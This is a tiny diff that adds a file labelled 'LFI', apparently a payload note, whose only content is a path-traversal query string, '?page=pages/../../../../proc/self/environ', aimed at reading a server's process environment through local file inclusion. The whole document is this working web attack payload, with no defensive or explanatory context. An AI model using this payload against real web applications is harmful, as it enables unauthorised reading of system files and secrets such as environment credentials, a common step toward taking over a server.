@@ -1,0 +1,4 @@
+LFI 
+
+"?page=pages/../../../../proc/self/environ"
+
